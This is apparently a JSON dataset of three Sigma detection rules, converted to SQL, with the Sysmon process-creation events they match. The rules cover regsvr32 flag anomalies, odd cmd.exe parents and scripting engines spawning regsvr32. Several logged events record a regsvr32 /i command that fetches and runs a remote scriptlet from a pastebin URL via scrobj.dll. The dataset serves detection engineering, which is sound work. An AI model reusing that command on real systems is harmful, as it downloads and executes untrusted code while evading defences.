[{
  "title": "Potential Regsvr32 Commandline Flag Anomaly",
  "id": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
  "description": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\regsvr32.exe' ESCAPE '\\' AND (CommandLine LIKE '% -i:%' ESCAPE '\\' OR CommandLine LIKE '% /i:%' ESCAPE '\\' OR CommandLine LIKE '% –i:%' ESCAPE '\\' OR CommandLine LIKE '% —i:%' ESCAPE '\\' OR CommandLine LIKE '% ―i:%' ESCAPE '\\')) AND (NOT CommandLine LIKE '% -n %' ESCAPE '\\' OR CommandLine LIKE '% /n %' ESCAPE '\\' OR CommandLine LIKE '% –n %' ESCAPE '\\' OR CommandLine LIKE '% —n %' ESCAPE '\\' OR CommandLine LIKE '% ―n %' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1218.010"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll",
      "Company": "Microsoft Corporation",
      "Computer": "IEWIN7",
      "CurrentDirectory": "C:\\Users\\IEUser\\",
      "Description": "Microsoft(C) Register Server",
      "EventID": 1,
      "EventRecordID": 16792,
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
      "IMPHASH": "A2DAD36BD73280726DA578EB659D0583",
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "365ABB72-63FC-5CD8-0000-0020EE3E0100",
      "LogonId": "0x13eee",
      "MD5": "432BE6CF7311062633459EEF6B242FB5",
      "Opcode": 0,
      "OriginalLogfile": "exec_sysmon_lobin_regsvr32_sct.evtx",
      "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "365ABB72-6693-5CD8-0000-0010AE4C0E00",
      "ParentProcessId": 3528,
      "ProcessGuid": "365ABB72-6759-5CD8-0000-0010E2D50F00",
      "ProcessID": 1880,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "A774A816662FF5B75669AA5BCE751BAB9D0972B8",
      "SHA256": "890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B",
      "SystemTime": "2019-05-12T18:35:05.155949Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 2020,
      "User": "IEWIN7\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-05-12 18:35:05.140",
      "Version": 5
    }
  ]
},
{
  "title": "Unusual Parent Process For Cmd.EXE",
  "id": "4b991083-3d0e-44ce-8fc4-b254025d8d4b",
  "description": "Detects suspicious parent process for cmd.exe",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (Image LIKE '%\\\\cmd.exe' ESCAPE '\\' AND (ParentImage LIKE '%\\\\csrss.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\ctfmon.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\dllhost.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\epad.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\FlashPlayerUpdateService.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\GoogleUpdate.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\jucheck.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\jusched.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\LogonUI.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\lsass.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\regsvr32.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\SearchIndexer.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\SearchProtocolHost.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\SIHClient.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\sihost.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\slui.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\spoolsv.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\sppsvc.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\taskhostw.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\unsecapp.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\WerFault.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\wermgr.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\wlanext.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\WUDFHost.exe' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.t1059"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "IEWIN7",
      "CurrentDirectory": "C:\\Users\\IEUser\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 16793,
      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",
      "IMPHASH": "CEEFB55F764020CC5C5F8F23349AB163",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "365ABB72-63FC-5CD8-0000-0020EE3E0100",
      "LogonId": "0x13eee",
      "MD5": "AD7B9C14083B52BC532FBA5948342B98",
      "Opcode": 0,
      "OriginalLogfile": "exec_sysmon_lobin_regsvr32_sct.evtx",
      "ParentCommandLine": "regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll",
      "ParentImage": "C:\\Windows\\System32\\regsvr32.exe",
      "ParentProcessGuid": "365ABB72-6759-5CD8-0000-0010E2D50F00",
      "ParentProcessId": 1420,
      "ProcessGuid": "365ABB72-6759-5CD8-0000-001085031000",
      "ProcessID": 1880,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "EE8CBF12D87C4D388F09B4F69BED2E91682920B5",
      "SHA256": "17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE",
      "SystemTime": "2019-05-12T18:35:05.780949Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 2020,
      "User": "IEWIN7\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-05-12 18:35:05.765",
      "Version": 5
    }
  ]
},
{
  "title": "Scripting/CommandLine Process Spawned Regsvr32",
  "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
  "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((ParentImage LIKE '%\\\\cmd.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\cscript.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\mshta.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\powershell\\_ise.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\powershell.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\pwsh.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\wscript.exe' ESCAPE '\\') AND Image LIKE '%\\\\regsvr32.exe' ESCAPE '\\') AND (NOT (ParentImage LIKE 'C:\\\\Windows\\\\System32\\\\cmd.exe' ESCAPE '\\' AND CommandLine LIKE '% /s C:\\\\Windows\\\\System32\\\\RpcProxy\\\\RpcProxy.dll' ESCAPE '\\'))))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1218.010"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll",
      "Company": "Microsoft Corporation",
      "Computer": "IEWIN7",
      "CurrentDirectory": "C:\\Users\\IEUser\\",
      "Description": "Microsoft(C) Register Server",
      "EventID": 1,
      "EventRecordID": 16792,
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",
      "IMPHASH": "A2DAD36BD73280726DA578EB659D0583",
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "365ABB72-63FC-5CD8-0000-0020EE3E0100",
      "LogonId": "0x13eee",
      "MD5": "432BE6CF7311062633459EEF6B242FB5",
      "Opcode": 0,
      "OriginalLogfile": "exec_sysmon_lobin_regsvr32_sct.evtx",
      "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "365ABB72-6693-5CD8-0000-0010AE4C0E00",
      "ParentProcessId": 3528,
      "ProcessGuid": "365ABB72-6759-5CD8-0000-0010E2D50F00",
      "ProcessID": 1880,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "A774A816662FF5B75669AA5BCE751BAB9D0972B8",
      "SHA256": "890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B",
      "SystemTime": "2019-05-12T18:35:05.155949Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 2020,
      "User": "IEWIN7\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-05-12 18:35:05.140",
      "Version": 5
    }
  ]
}]